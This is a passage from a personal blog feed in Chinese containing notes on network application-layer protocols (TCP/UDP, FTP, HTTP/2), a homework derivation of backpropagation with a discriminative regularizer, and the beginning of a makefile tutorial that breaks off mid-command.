src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211309460198_376_20221026090258905463_489_image-20221012112556726.png" alt="image-20221012112556726"><figcaption aria-hidden="true">image-20221012112556726</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211310915799_585_20221026090300525887_688_image-20220928094631013.png" alt="image-20220928094631013"><figcaption aria-hidden="true">image-20220928094631013</figcaption></figure><h4 id="进程地址标识">进程地址标识</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211312679793_765_20221026090302563658_334_image-20220928101653200.png" alt="image-20220928101653200"><figcaption aria-hidden="true">image-20220928101653200</figcaption></figure><h4 id="应用层协议定义的内容">应用层协议定义的内容</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211314098352_565_20221026090304286709_112_image-20220928103019165.png" alt="image-20220928103019165"><figcaption aria-hidden="true">image-20220928103019165</figcaption></figure><h4 id="传输层">传输层</h4><p>作用：保证端到端服务的可靠性</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211315890938_941_20221026090306529509_443_image-20220928103725740.png" alt="image-20220928103725740"><figcaption aria-hidden="true">image-20220928103725740</figcaption></figure><p>UCP服务的不可靠是相对的，只是级别比较低。</p><p>UCP的优势：建立连接快，占用资源少，实现简单，不容易被监控</p><p class="note note-info">无论TCP还是UDP都没有提供任何加密机制，这就是说发送进程传进其套接字的数据，与经网络传送到目的进程的数据相同。因此，举例来说如果某发送进程以明文方式（即没有加密）发送了一个口令进入它的套接字，该明文口令将经过发送方与接收方之间的所有链路传送，这就可能在任何中间链路被嗅探和发现。因为隐私和其他安全问题对许多应用而言已经成为至关重要的问题，所以因特网界已经研制了TCP的加强版本，称为安全套接字层(SecureSocketsLayer，SSL)。用SSL加强后的TCP不仅能够做传统的TCP所能做的一切，而且提供了关键的进程到进程的安全性服务，包括加密、数据完整性和端点鉴别。</p><p>TCP/IP协议通常在操作系统的内核中实现</p><h4 id="socket">socket</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211317698073_125_20221026090312331202_111_image-20220928111844557.png" alt="image-20220928111844557"><figcaption aria-hidden="true">image-20220928111844557</figcaption></figure><p>TCP/UDP协议感性认识</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211319606921_893_20221026090313969554_614_image-20220928135917798.png" alt="image-20220928135917798" width="50%" height="50%"></p><h4 id="socket编程">socket编程</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211321908968_371_20221026090321048624_770_image-20221005095507884.png" alt="image-20221005095507884"><figcaption aria-hidden="true">image-20221005095507884</figcaption></figure><p>PowerPC采用大端序，其他CPU大多使用小端序。网络编程使用大端序。</p><h3 id="文件传输协议">文件传输协议</h3><p>FTP基于TCP的可靠服务</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211323746227_758_20221026090322840513_285_image-20221012093347724.png" alt="image-20221012093347724"><figcaption aria-hidden="true">image-20221012093347724</figcaption></figure><p>对应的，邮件传输是带内控制。</p><blockquote><p>FTP客户首先连接服务器的21号端口，建立控制连接（控制连接在整个会话期间一直保持打开)，然后建立数据连接，在数据传送完毕后，数据连接最先释放，控制连接最后释放。</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211325291125_471_20221026090326097608_519_image-20221012095753630.png" alt="image-20221012095753630"><figcaption aria-hidden="true">image-20221012095753630</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211327293354_420_20221026090328651614_685_image-20221012095828837.png" alt="image-20221012095828837"><figcaption aria-hidden="true">image-20221012095828837</figcaption></figure><p>D</p><p class="note note-info">为什么FTP不适合共享读写文件？因为FTP使用了一个分离的控制连接，所以也称FTP的控制信息是带外(Out-of-band)传送的？使用FTP时，若要修改服务器上的文件，则需要先将此文件传送到本地主机，然后再将修改后的文件副本传送到原服务器，来回传送耗费很多时间。网络文件系统(NFS)采用另一种思路，它允许进程打开一个远程文件，并能在该文件的某个特定位置开始读写数据。这样，NFS可使用户复制一个大文件中的一个很小的片段，而不需要复制整个大文件。</p><blockquote><p>针对文件传输FTP，系统管理员建立了一个特殊的用户ID，名为anonymous，即匿名用户。Internet上的任何人在任何地方都可以使用该用户ID，只是在要求提供用户ID时必须输入anonymous，该用户ID的密码可以是任何字符串。</p></blockquote><p class="note note-info">为什么FTP要采用两个独立的连接？在FTP的实现中，客户与服务器之间采用了两条传输连接，其中控制连接用于传输各种FTP命令，而数据连接用于文件的传送。之所以这样设计，是因为使用两条独立的连接可使FTP变得更加简单、更容易实现、更有效率。同时在文件传输过程中，还可以利用控制连接控制传输过程，如客户可以请求终止、暂停传输等。</p><h3 id="web服务和http协议">Web服务和HTTP协议</h3><h4 id="最新最热http2.0">最新最热HTTP2.0</h4><h5 id="二进制分帧传输">二进制分帧传输</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211328528137_956_20221026090330394790_595_image-20221012105830716.png" alt="image-20221012105830716"><figcaption aria-hidden="true">image-20221012105830716</figcaption></figure><h5 id="tcp连接复用">TCP连接复用</h5><p>虽然想法很朴素，但确解决了为追求简单和仅适应文本传输的历史遗留问题</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211333340697_530_20221026090332798519_644_image-20221012110140184.png" alt="image-20221012110140184"><figcaption aria-hidden="true">image-20221012110140184</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211334737243_297_20221026090334780017_529_image-20221012110329212.png" alt="image-20221012110329212"><figcaption aria-hidden="true">image-20221012110329212</figcaption></figure><h5 id="服务器推送和http头压缩">服务器推送和HTTP头压缩</h5><p>当然服务器推送也增加了服务器的压力，因为之前服务器并不需要关注传输的是什么内容</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211336812610_639_20221026090336747509_846_image-20221012110625529.png" alt="image-20221012110625529"><figcaption aria-hidden="true">image-20221012110625529</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211337992835_205_20221026090338868210_673_image-20221012111205235.png" alt="image-20221012111205235"><figcaption aria-hidden="true">image-20221012111205235</figcaption></figure><h4 id="cdn">CDN</h4><h4 id="dash">DASH</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211339309558_325_20221026090340524655_762_image-20221019092551081.png" alt="image-20221019092551081"><figcaption aria-hidden="true">image-20221019092551081</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211341451867_907_20221026090342143506_385_image-20221019092718918.png" alt="image-20221019092718918"><figcaption aria-hidden="true">image-20221019092718918</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211342854815_392_20221026090343857447_572_image-20221019092804145.png" alt="image-20221019092804145"><figcaption aria-hidden="true">image-20221019092804145</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MLP_BP反向传播</title>
    <link href="/posts/43013/"/>
    <url>/posts/43013/</url>
    
    <content type="html"><![CDATA[<h1 id="mlp_bp反向传播">MLP_BP反向传播</h1><h2 id="实验要求">实验要求</h2><p>以三层感知机为例，使用反向传播算法更新MLP的权重和偏置项。</p><p>Define <span class="math inline">\(S_w\)</span> and <span class="math inline">\(S_b\)</span> as: <span class="math display">\[\begin{aligned}&amp;S_w=\sum_{c=1}^C \sum_{\boldsymbol{y}_i^M \inc}\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)^T\\&amp;S_b=\sum_{c=1}^Cn_c\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)^T\end{aligned}\]</span> where <span class="math inline">\(m_c^M\)</span> is the meanvector of <span class="math inline">\(\boldsymbol{y}_i^M\)</span> (theoutput of the <span class="math inline">\(i\)</span> th sample from thecth class), <span class="math inline">\(\boldsymbol{m}^M\)</span> is themean vector of the output <span class="math inline">\(\boldsymbol{y}_i^M\)</span> from all classes,<span class="math inline">\(n_c\)</span> is the number of samples fromthe cth class. Define the discriminative regularization term <span class="math inline">\(\operatorname{tr}\left(S_w\right)-\operatorname{tr}\left(S_b\right)\)</span>and incorporate it into the objective function of the MLP: <span class="math display">\[E=\sum_i \sum_j \frac{1}{2}\left(\boldsymbol{y}_{i,j}^M-\boldsymbol{d}_{i, j}\right)^2+\frac{1}{2}\gamma\left(\operatorname{tr}\left(S_w\right)-\operatorname{tr}\left(S_b\right)\right).\]</span></p><h2 id="符号说明">符号说明</h2><p>以经典的手写体识别任务为例，说明本次实验推导所用符号的含义：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/MLP_BP%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/20230828210815136024_245_20221231171137685205_418_image-20221231170939828.png"></p><p>其中<span class="math inline">\(\sigma\)</span>为激活函数，此处使用sigmoid函数即</p><p><span class="math display">\[\sigma(x)=\frac{1}{1+e^{-x}}\]</span> 导函数为 <span class="math display">\[\sigma^{\prime}(x)=\sigma(x)(1-\sigma(x))\]</span></p><h2 id="对正则项的理解">对正则项的理解</h2><p>首先我们看到，这个题目中的正则项不同于常见的L1正则项或者L2正则项。那么它代表什么含义，又是怎么起到正则化的作用的呢？</p><p>在了解了线性判别分析之后，发现这个正则项与线性判别分析中所谓的”类内散度矩阵“和”类问散度矩阵"非常相似。而线性判别分析的核心思想便是”类内方差小、类间间隔大“，在这里也是如此。<span class="math display">\[\begin{aligned}&amp;S_w=\sum_{c=1}^C \sum_{\boldsymbol{y}_i^M \inc}\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)^T\\&amp;S_b=\sum_{c=1}^Cn_c\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)^T\end{aligned}\]</span> <span class="math display">\[E=\sum_i \sum_j \frac{1}{2}\left(\boldsymbol{y}_{i,j}^M-\boldsymbol{d}_{i, j}\right)^2+\frac{1}{2}\gamma\left(\operatorname{tr}\left(S_w\right)-\operatorname{tr}\left(S_b\right)\right).\]</span></p><p>从损失函数可以看出，，我们希望让类内散度矩阵<span class="math inline">\(S_w\)</span>尽可能小，即同一类的样本尽量预测结果一致；同时<span class="math inline">\(S_b\)</span>是类间散度矩阵，我们希望让它尽可能大，以让模型更好的”区别“开不同的样本。</p><p>为了下面分析的方便，对损失函数进行拆解。</p><p>容易证明，对于两个阶数都是 <span class="math inline">\(m \timesn\)</span> 的矩阵 <span class="math inline">\(\boldsymbol{A}_{m \timesn}, \boldsymbol{B}_{m \times n}\)</span>, 其中一个矩阵乘以另一个矩阵的转置的迹, 本质是 <span class="math inline">\(\boldsymbol{A}_{m \times n}, \boldsymbol{B}_{m\times n}\)</span> 两个矩阵对应位置的元素相乘并相加,可以理解为向量的点积在矩阵上的推广, 即: <span class="math display">\[\begin{aligned}\operatorname{tr}\left(\boldsymbol{A} \boldsymbol{B}^T\right)&amp;=a_{11} b_{11}+a_{12} b_{12}+\cdots+a_{1 n} b_{1 n} \\&amp;+a_{21} b_{21}+a_{22} b_{22}+\cdots+a_{2 n} b_{2 n} \\&amp;+\cdots \\&amp;+a_{m 1} b_{m 1}+a_{m 2} b_{m 2}+\cdots+a_{m n} b_{m n}\end{aligned}\]</span>则对于题中的列向量也是如此，在损失函数中表现为各元素的平方和。</p><p>由此可以得到单个样本单个特征的损失函数: <span class="math display">\[E_{ij}=\frac{1}{2}\left({y}_{i, j}-{d}_{i, j}\right)^2+\frac{1}{2}\gamma\left[\left({y}_{i,j}-{m}_{c,j}\right)^2-\left({m}_{c,j}-m_j\right)^2\right]\]</span></p><p>对此公式符号的含义进行如下直观解释:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/MLP_BP%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/20230828210816459308_622_20221124231357983833_279_image-20221124230019479.png" alt="image-20221124230019479"><figcaption aria-hidden="true">image-20221124230019479</figcaption></figure><p>注：上图所指<span class="math inline">\(j\)</span>也为<span class="math inline">\(3\)</span>；<span class="math inline">\(m_j\)</span>表示第<span class="math inline">\(j\)</span>类上的预测值在所有样本上的平均。 ##梯度下降求解</p><h3 id="目标">目标</h3><p>首先我们需要清楚反向传播的目的：我们希望根据模型在样本上的表现结果调节模型，最小化损失函数以让其在训练集上的表现更好。</p><p>具体到神经网络，我们需要调节的是每一条边对应的权重或偏置，依据是损失函数对该层权重的偏导。直观一点说，偏导反映的是参数的微小变化对损失的影响。我们希望最小化损失函数，那么比如如果求出来对权重的偏导是正的，那么说明损失函数随权重增大而增大，那么就要让权重变小一点。</p><p>因此我们更新参数的方式如下： <span class="math display">\[\begin{aligned} W^{(l)} &amp;=W^{(l)}-\frac{\alpha}{d }\frac{\partialE}{\partial W^{(l)}}\\ \boldsymbol b^{(l)} &amp;=\boldsymbolb^{(l)}-\frac{\alpha}{d}\frac{\partial E}{\partial b^{(l)}}\end{aligned}\tag{1}\]</span> 其中<span class="math inline">\(l\)</span>是权重和偏置所在的层数，对于三层感知机<span class="math inline">\(l=1,2\)</span>。<span class="math inline">\(\alpha\)</span>为学习率。 <span class="math inline">\(d\)</span>为整个训练集大小，比如对于MNIST这个值为60000。</p><h3 id="偏导求解">偏导求解</h3><p>在上面定义了对于单个样本单个特征的损失函数。下面为简化叙述，采用逐样本进行偏导的求解。根据题目的含义我们应该是使用<strong>批量梯度下降法</strong>进行更新，此时将对每个样本求得的偏导加起来求得总的<span class="math inline">\(E\)</span>代入<span class="math inline">\((1)\)</span>中（而不是每个样本都使用<span class="math inline">\((1)\)</span>式进行更新）即可。</p><p>也就是 <span class="math display">\[E_i=\sum_{j=1}^{c} E_{ij}\\E=\sum_{i=1}^{d} E_{i}\]</span></p><p><span class="math inline">\(c\)</span>为类的个数，比如手写体识别中为10，数字<span class="math inline">\(j\)</span>对应于类<span class="math inline">\(j+1\)</span>。</p><p>阅读下面的求解过程时如果担心忘记符号对应的含义，可以将下图固定在屏幕上。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/MLP_BP%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/20230828210815136024_245_20221231171137685205_418_image-20221231170939828.png"></p><h4 id="最后一层">最后一层</h4><p>从总体来看，对于最后一层的某个边<span class="math inline">\(w_{jk}\)</span>的权重更新是比较容易进行的。如图所示，<span class="math inline">\(j=1,2...c\)</span>，<span class="math inline">\(c\)</span>为类别的个数。<span class="math inline">\(k=1,2...h\)</span>，<span class="math inline">\(h\)</span>为隐层包含的神经元个数。</p><p>由链式法则，有：</p><p><span class="math display">\[\frac{\partial E_i}{\partial w_{jk}}=\frac{\partial z_{i,j}}{\partial w_{jk}}\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\]</span>由于符号定义中第三层的神经元能够比较好的和第二层的区别开，故省略了表示层数的上标；而<span class="math inline">\(z\)</span>和<span class="math inline">\(a\)</span>的取值与均与特定的样本有关，故都保留了表示样本的下角标<span class="math inline">\(i\)</span>。</p><p>我们仍旧可以直观的理解链式法则对应于参数更新的含义。我们要求的是损失函数<span class="math inline">\(E_i\)</span>对<span class="math inline">\(w_{jk}\)</span>的敏感程度，而<span class="math inline">\(w_{jk}\)</span>能够直接影响的是<span class="math inline">\(z_{ij}\)</span>，<span class="math inline">\(z_{i,j}\)</span>影响<span class="math inline">\(y_{ij}\)</span>，<span class="math inline">\(y_{i,j}\)</span>才直接影响到损失函数。因此需要借助链式法则将这个”影响链“串起来。</p><p><span class="math inline">\(z_{i,j}\)</span>取决于第二层所有神经元，但我们只需要关注与正在求偏导的边相关的节点：<span class="math display">\[z_{i,j}=\cdots+w_{j k} a_k+\cdots\]</span> 故有 <span class="math display">\[\frac{\partial z_{i,j}}{\partial w_{jk}}=a_{i,k}\]</span> <span class="math inline">\(y_{i,j}=\sigma\left(z_{ij}\right)\)</span>，因此<span class="math inline">\(\frac{\partial y_{i,j}}{\partial z_{i,j}}\)</span> 就等于激活函数的导数，即<span class="math inline">\({\sigma}’\left(z_{i,j}\right)\)</span>。重点是最后一项：<span class="math display">\[\frac{\partial E_i}{\partial y_{i,j}}=\frac{\partial{(\sum_{p=1}^{c}}E_{ip})}{\partial y_{i,j}}\]</span> 而 <span class="math display">\[E_{ip}=\frac{1}{2}\left({y}_{i,p}-{d}_{i, p}\right)^2+\frac{1}{2}\gamma\left[\left({y}_{i,p}-{m}_{c,p}\right)^2-\left({m}_{c,p}-m_p\right)^2\right]\]</span> <span class="math inline">\(E_{ip}\)</span>中包含<span class="math inline">\(E_{ij}\)</span>，而且我们只关心<span class="math inline">\(E_{ij}\)</span>。<span class="math inline">\(E_{ij}\)</span>里面自然有一个<span class="math inline">\(y_{ij}\)</span>。不仅如此，别忘了<span class="math inline">\({m}_{c,j}\)</span>和<span class="math inline">\(m_j\)</span>也都是与<span class="math inline">\(y_{ij}\)</span>相关的变量，比如 <span class="math display">\[{m}_{c,j}=\frac{1}{n_c}\sum_{N=1}^{n_c}{y}_{N,j}\]</span> <span class="math inline">\(c_N\)</span>是这个样本所属的类在训练集中的数目，比如这个样本实际上是个"3"，那么<span class="math inline">\(c_N\)</span>就是训练集中"3"的数目。</p><p><span class="math inline">\({y}_{i, j}\)</span>自然对应<span class="math inline">\({y}_{N, j}\)</span>中的某一个。因此 <span class="math display">\[\frac{\partial {m}_{c,j}}{\partial y_{ij}}=\frac{1}{n_c}\]</span></p><p>同样的， <span class="math display">\[{m}_{j}=\frac{1}{d}\sum_{N=1}^{d}{y}_{N, j}\\\frac{\partial {m}_{j}}{\partial y_{ij}}=\frac{1}{d}\]</span> <span class="math inline">\(d\)</span>是训练集中样本数目。</p><p>由此我们可以继续求解：</p><p><span class="math display">\[\begin{align}\frac{\partial E_i}{\partialy_{i,j}}&amp;=\frac{\partial{(\sum_{p=1}^{c} }E_{ip})}{\partialy_{ij}}=\frac{\partial{E_{ij} }}{\partial y_{ij}}\\&amp;={y}_{i,j}-{d}_{i,j}+\gamma\left[(y_{ij}-m_{c,j})(1-\frac{1}{n_c})-(m_{cj}-m_{j})(\frac{1}{n_c}-\frac{1}{d})\right]    \end{align}\]</span></p><p>将上面求得的结果代入对<span class="math inline">\(w_{jk}\)</span>求偏导的式子中： <span class="math display">\[\begin{align}\frac{\partial E_i}{\partial w_{jk}}&amp;=\frac{\partial z_{i,j}}{\partial w_{jk}}\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\\&amp;=a_{i,k}\;{\sigma}’\left(z_{i,j}\right)\;\left \{ {y}_{i,j}-{d}_{i,j}+\gamma\left[(y_{ij}-m_{c,j})(1-\frac{1}{n_c})-(m_{cj}-m_{j})(\frac{1}{n_c}-\frac{1}{d})\right]\right\}    \end{align}\]</span>最后，如果我们想要进行批量梯度下降，需要将所有训练集中样本的损失函数加起来求平均，进行一次更新：<span class="math display">\[\begin{align}\frac{\partial E}{\partial w_{jk}}&amp;=\sum_{i=1}^{d}\frac{\partial E_i}{\partial w_{jk}}\\&amp;=\sum_{i=1}^{d}a_{i,k}\;{\sigma}’\left(z_{i，j}\right)\;\left \{{y}_{i,j}-{d}_{i,j}+\gamma\left[(y_{ij}-m_{c,j})(1-\frac{1}{n_c})-(m_{cj}-m_{j})(\frac{1}{n_c}-\frac{1}{d})\right]\right\}    \end{align}\]</span> 由于三个部分均与<span class="math inline">\(i\)</span>有关，所以没有可以提取的公因子，需要逐项累加。并且该式子与第<span class="math inline">\(i\)</span>个样本所属类有关，因此也要根据样本情况代入相应的的<span class="math inline">\(n_c\)</span>和</p><p><span class="math inline">\(m_{c,j}\)</span>。</p><p>此时我们就可以代入<span class="math inline">\((1)\)</span>式(更新参数的方式)中，进行每条权重边的更新了。</p><p>对于最后一层的<span class="math inline">\(b_j\)</span>对应偏置的边求解的方式和<span class="math inline">\(w_{jk}\)</span>类似。 <span class="math display">\[\frac{\partial E_i}{\partial b_{j}}=\frac{\partial z_{i,j}}{\partial b_{j}}\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\]</span> <span class="math inline">\(\frac{\partial z_{i,j}}{\partialb_{j}}=b^{(2)}\)</span>，<span class="math inline">\(\frac{\partialy_{i,j}}{\partial z_{i,j}}\)</span>和<span class="math inline">\(\frac{\partial E_i}{\partialy_{i,j}}\)</span>已经求得，代入即可。</p><h4 id="倒数第二层">倒数第二层</h4><p>倒数第二层某一条权重边记为<span class="math inline">\(w_{kn}\)</span>。 <span class="math display">\[\frac{\partial E_i}{\partial w_{kn}}=\frac{\partial z_{i,k}}{\partial w_{kn}}\frac{\partial a_{i,k}}{\partial z_{i,k}}\frac{\partial E_i}{\partial a_{i,k}}\]</span></p><p>重点是<span class="math inline">\(\frac{\partial E_i}{\partiala_{i,k}}\)</span>。它通过影响最后一层的所有节点去影响最终的损失函数。<span class="math display">\[\frac{\partial E_i}{\partial a_{i,k}}=\underbrace{\sum_{p=1}^{c}\frac{\partial z_{i,j}}{\partial a_{i,k}} \frac{\partialy_{i,j}}{\partial z_{i,j}} \frac{\partial E_i}{\partial y_{i,j}}}_{\text{Sum over the output layer }}\]</span> 不同于<span class="math inline">\(z_{i,k}\)</span>，<span class="math inline">\(z_{i,j}\)</span>自然是指最后一层的线性变换。</p><p><span class="math inline">\(\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\)</span>我们前面已经求得了。<span class="math inline">\(\frac{\partial z_{i,j}}{\partiala_{i,k}}=w_{jk}\)</span>。</p><p>根据递推关系其实也没有很复杂。</p><p>前面两项非常容易求得： <span class="math display">\[\frac{\partial a_{i,k}}{\partial z_{i,k}}=\sigma’\left(z_{i,k}\right)\\\frac{\partial z_{i,k}}{\partial w_{kn}}=x_{i,n}\]</span></p><p>同样的，各个样本上的偏导累加并求平均，然后设置学习率进行梯度下降更新参数即可。<span class="math display">\[\frac{\partial E_i}{\partial b_{k}}=\frac{\partial z_{i,k}}{\partial b_{k}}\frac{\partial a_{i,k}}{\partial z_{i,k}}\frac{\partial E_i}{\partial a_{i,k}}\]</span> <span class="math inline">\(\frac{\partial z_{i,k}}{\partialb_{k}}=b^{(1)}\)</span>，其余部分也都已经知道了，因此代入即可按同样的方式更新<span class="math inline">\(\boldsymbol b\)</span>。</p><p>至此，所有的权重和偏置项都已经更新完毕。</p><h2 id="思考">思考</h2><p>这个正则项与线性判别分析一样，思路很自然，数学表达也很严谨，确远不如L1或L2正则项用的广泛。虽然并没有基于此做过实验，但从推导的过程可以看到，相比L1或L2正则项直接对权重矩阵的范数求导，计算量明显要大的多。比如至少要预先把预测每一类对应的样本数和样本向量均值算出来，在求偏导时也要判断是属于哪一类，对性能肯定是有所损耗。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>makefile急速入门</title>
    <link href="/posts/23557/"/>
    <url>/posts/23557/</url>
    
    <content type="html"><![CDATA[<h1 id="makefile-急速入门">Makefile 急速入门</h1><p>或许你和我一样在完全没有接触过<code>makefile</code>的时候看到相对复杂一点的项目依赖感到头大。这里从最简单的情况，到常见用法，快速把<code>makefile</code>的基本用法捋一遍。</p><h2 id="最小示例">最小示例</h2><p>下面的过程想必接触过linux平台下的编程都应该很熟悉：</p><p>新建一个示例程序<em>main.c</em>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w1uhvtlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-w1uhvtlmrh9u65"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello world!"</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>正常情况下，通过 <code>gcc</code>在命令行将其编译后产出相应文件，可执行文件或 object 文件等。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-540t60lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-540t60lmrh9u65"><pre><code class="hljs shell">(base) ➜ gcc -o main.out main.c</code></pre></div></div><p>上面命令编译后运行 <code>main.out</code> 可执行文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-45wkaglmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-45wkaglmrh9u65"><pre><code class="hljs shell">(base) ➜ ./main.outhello world!</code></pre></div></div><h2 id="makefile-初步认知">Makefile 初步认知</h2><h3 id="从动手做开始">从动手做开始</h3><p>如果我们想用到中间代码联合编译/链接，或者有大量的源文件做不同的处理，那么敲一行一行的命令将是灾难级的。即使通过按上下箭头的方式回退命令也会浪费很多时间，这时<code>makefile</code>的作用便显现出来了。但是为了便于学习，从上面的最小示例开始，先动手做一下，有一个感性的认知：</p><p>在与<code>main.c</code>同目录下创建文件<code>makefile</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ium0w9lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-ium0w9lmrh9u65"><pre><code class="hljs shell">touch makefile</code></pre></div></div><p>填入以下内容：</p><p><em>Makefile</em></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tjs60olmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-tjs60olmrh9u65"><pre><code class="hljs makefile"><span class="hljs-section">all:main.out</span>  <span class="hljs-comment"># make all</span><span class="hljs-section">main.out: main.c</span><span class="hljs-comment"># test make</span>gcc -o main.out main.c<span class="hljs-section">clean:</span>rm main.out</code></pre></div></div><p>上面的 Makefile 中定义了三个任务，调用时可通过<code>make &lt;target name&gt;</code> 形式来调用。</p><p>比如:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0mzxhslmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-0mzxhslmrh9u65"><pre><code class="hljs shell">(base) ➜ make main.out<span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">test</span> make</span>gcc -o main.out main.c</code></pre></div></div><p>默认情况下<code>makefile</code>会打印每条命令(包括注释)，然后再执行，也就是所谓的echoing。这是在基于在构建时需要了解当前在执行哪条命令的需要。</p><p>之后你会发现在目录下产生了<code>main.out</code> 文件。</p><p>如果想关闭回声，可以在命令的前面加上@。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ht69y1lmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-ht69y1lmrh9u65"><pre><code class="hljs makefile"><span class="hljs-section">main.out: main.c</span>@<span class="hljs-comment"># test make</span>gcc -o main.out main.c</code></pre></div></div><p>习惯上<code>clean</code>任务被定义用于清除生成的目标构建文件。在这里试一下用<code>clean</code>把刚刚的<code>main.out</code>删掉：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-obha2xlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-obha2xlmrh9u65"><pre><code class="hljs shell">(base) ➜ make cleanrm 